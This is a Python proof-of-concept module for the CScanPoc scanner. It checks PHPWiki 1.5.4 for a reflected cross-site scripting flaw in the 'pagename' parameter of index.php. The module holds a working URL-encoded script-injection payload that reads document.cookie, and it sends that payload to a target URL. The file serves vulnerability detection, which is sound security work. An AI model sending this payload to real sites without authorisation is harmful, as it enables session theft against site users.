# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse
import urllib.request
import urllib.parse
import urllib.error
import re


class Vuln(ABVuln):
    vuln_id = 'PHPWiki_0000'  # 平台漏洞编号，留空
    name = 'PHPWiki 1.5.4 /index.php  XSS'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2015-08-31'  # 漏洞公布时间
    desc = '''
        PhpWiki是一个开源的wiki引擎程序，运行于PHP环境。
        Cross-site scripting vulnerability in user preferences allows remote unauthenticated users to inject arbitrary web script by injecting code via GET or POST 'pagename' parameter.
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/38027/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPWiki'  # 漏洞应用名称
    product_version = 'PHPWiki 1.5.4 /index.php  XSS漏洞'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd5da311a-5dd9-4667-a893-2d38fbcd401a'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-03'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = ('/index.php?pagename=%3C%2Fscript%3E%3Cscript%3Ealert%28d'
                       'ocument.cookie%29%3C%2Fscript%3E%3C!--')
            verify_url = self.target + payload

            req = urllib.request.urlopen(verify_url)
            statecode = urllib.request.urlopen(verify_url).getcode()
            content = req.read()
            if statecode == 200 and re.search('var pagename  = \'</script><script>alert\(document\.cookie\)</script><!--\'', content):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
